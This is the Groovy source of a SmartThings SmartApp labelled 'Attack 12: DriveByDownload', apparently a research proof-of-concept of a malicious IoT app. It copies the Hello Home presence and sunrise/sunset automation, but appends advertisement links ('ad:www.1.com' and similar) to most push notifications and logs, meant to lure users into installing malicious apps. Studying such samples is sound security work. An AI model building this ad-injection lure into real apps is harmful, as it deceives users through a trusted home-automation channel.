/**
 * Attack Description:
 * 		The attacker would send different advertisement to ask user to download his smartApps which have malicious functions.
 * Normal functions:
 * 		 The normal Hello Home smartApp could send different message to the user according to the sun and the location of the user, like good morning, welcome home.
 * Malicious functions:
 * 		 The malicious Hello Home smartApp would add the advertisements to the user’s normal message every time it needs to send the message to the user.
 */
definition(
		name: "Attack 12: DriveByDownload",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Drive by download.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	page(name: "selectPhrases")
	page(name:"Settings", title:"Settings", uninstall:true, install:true ) {
		section("False alarm threshold (defaults to 10 min)") {
			input "falseAlarmThreshold", "decimal", title: "Number of minutes", required: false
		}
		section("Zip code") {
			input "zip", "text", required: true
		}
		section("Notifications") {
			input "sendPushMessage", "enum", title: "Send a push notification when the house is empty?", metadata:[values:["Yes", "No"]], required:false
			input "sendPushMessageHome", "enum", title: "Send a push notification when the house is occupied?", metadata:[values:["Yes", "No"]], required:false
		}
		section(title: "More options", hidden: hideOptionsSection(), hideable: true) {
			label title: "Assign a name", required: false
			input "days", "enum", title: "Only on certain days of the week", multiple: true, required: false,
			options: [
				"Monday",
				"Tuesday",
				"Wednesday",
				"Thursday",
				"Friday",
				"Saturday",
				"Sunday"
			]
			input "modes", "mode", title: "Only when mode is", multiple: true, required: false
		}
	}
}


def selectPhrases() {
	def configured = (settings.awayDay && settings.awayNight && settings.homeDay && settings.homeNight)
	dynamicPage(name: "selectPhrases", title: "Configure", nextPage:"Settings", uninstall: true) {
		section("Who?") {
			input "people", "capability.presenceSensor", title: "Monitor the presences", required: true, multiple: true,  refreshAfterSelection:false
		}

		def phrases = location.helloHome?.getPhrases()*.label
		if (phrases) {
			phrases.sort()
			section("Run This Phrase When...") {
				input "awayDay", "enum", title: "Everyone is away and it's day.", required: true, options: phrases,  refreshAfterSelection:false
				input "awayNight", "enum", title: "Everyone is away and it's night.", required: true, options: phrases,  refreshAfterSelection:false
				input "homeDay", "enum", title: "At least one person is home and it's day.", required: true, options: phrases,  refreshAfterSelection:false
				input "homeNight", "enum", title: "At least one person is home and it's night.", required: true, options: phrases,  refreshAfterSelection:false
			}

			section("Select modes used for each condition. (Needed for better app logic)") {
				input "homeModeDay", "mode", title: "Select mode used for the 'Home Day' phrase", required: true
				input "homeModeNight", "mode", title: "Select mode used for the 'Home Night' phrase", required: true
			}
		}
	}
}


def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(people, "presence", presence)
	subscribe(location, "sunrise", setSunrise)
	subscribe(location, "sunset", setSunset)
	runIn(60, checkSun)
}


//change to sunrise mode on sunrise event
def setSunrise(evt) {
	state.sunMode = "sunrise";
	changeSunMode();
}

//change to sunset mode on sunset event
def setSunset(evt) {
	state.sunMode = "sunset";
	changeSunMode()
}

//check current sun state when installed.
def checkSun() {
	def zip = settings.zip as String
	def sunInfo = getSunriseAndSunset(zipCode: zip)
	def current = now()
	if (sunInfo.sunrise.time < current && sunInfo.sunset.time > current) {
		state.sunMode = "sunrise"
		setSunrise()
	}
	else {
		state.sunMode = "sunset"
		setSunset()
	}
}

//change mode on sun event
def changeSunMode() {
	if(everyoneIsAway() && (state.sunMode == "sunrise")) {
		log.info("Home is Empty  Setting New Away Mode/nad:www.6.com")
		def delay = (falseAlarmThreshold != null && falseAlarmThreshold != "") ? falseAlarmThreshold * 60 : 10 * 60
		runIn(delay, "setAway")
	}

	if(everyoneIsAway() && (state.sunMode == "sunset")) {
		log.info("Home is Empty  Setting New Away Mode/n ad:www.7.com")
		def delay = (falseAlarmThreshold != null && falseAlarmThreshold != "") ? falseAlarmThreshold * 60 : 10 * 60
		runIn(delay, "setAway")
	}

	else {
		log.info("Home is Occupied Setting New Home Mode/nad:www.8.com")
		setHome()
	}
}

//presence change run logic based on presence state of home

def presence(evt) {
	if(evt.value == "not present") {
		log.debug("Checking if everyone is away")
		if(everyoneIsAway()) {
			log.info("Nobody is home, running away sequence/n ad:www.9.com")
			def delay = (falseAlarmThreshold != null && falseAlarmThreshold != "") ? falseAlarmThreshold * 60 : 10 * 60
			runIn(delay, "setAway")
		}
	}
	else {
		def lastTime = state[evt.deviceId]
		if (lastTime == null || now() - lastTime >= 1 * 60000) {
			log.info("Someone is home, running home sequence/nad:www.10.com")
			setHome()
		}
		state[evt.deviceId] = now()
	}
}

//if empty set home to one of the away modes

def setAway() {
	if(everyoneIsAway()) {
		if(state.sunMode == "sunset") {
			def message = "Performing \"${awayNight}\" for you as requested./nad:www.1.com"
			log.info(message)
			sendAway(message)
			location.helloHome.execute(settings.awayNight)
		}

		else if(state.sunMode == "sunrise") {
			def message = "Performing \"${awayDay}\" for you as requested./nad:www.2.com"
			log.debug message
			log.info(message)
			sendAway(message)
			location.helloHome.execute(settings.awayDay)
		}
		else {
			log.debug("Mode is the same, not evaluating")
		}
	}
	else {
		log.info("Somebody returned home before we set to '${newAwayMode}'/nad:www.11.com")
	}
}

//set home mode when house is occupied
def setHome() {
	log.info("Setting Home Mode!!/n ad:www.5.com")
	if(anyoneIsHome()) {
		if(state.sunMode == "sunset"){
			if (location.mode != "${homeModeNight}"){
				def message = "Performing \"${homeNight}\" for you as requested./nad:www.3.com"
				log.info(message)
				sendHome(message)
				location.helloHome.execute(settings.homeNight)
			}
		}

		if(state.sunMode == "sunrise"){
			if (location.mode != "${homeModeDay}"){
				def message = "Performing \"${homeDay}\" for you as requested./nad:www.4.com"
				log.info(message)
				sendHome(message)
				location.helloHome.execute(settings.homeDay)
			}
		}
	}
}


private everyoneIsAway() {
	def result = true
	if(people.findAll { it?.currentPresence == "present" }) {
		result = false
	}
	log.debug("everyoneIsAway: ${result}")
	return result
}

private anyoneIsHome() {
	def result = false
	if(people.findAll { it?.currentPresence == "present" }) {
		result = true
	}
	log.debug("anyoneIsHome: ${result}")
	return result
}

def sendAway(msg) {
	if(sendPushMessage != "No") {
		log.debug("Sending push message")
		sendPush(msg)
	}
	log.debug(msg)
}

def sendHome(msg) {
	if(sendPushMessageHome != "No") {
		log.debug("Sending push message")
		sendPush(msg)
	}
	log.debug(msg)
}


private hideOptionsSection() {
	(starting || ending || days || modes) ? false : true
}

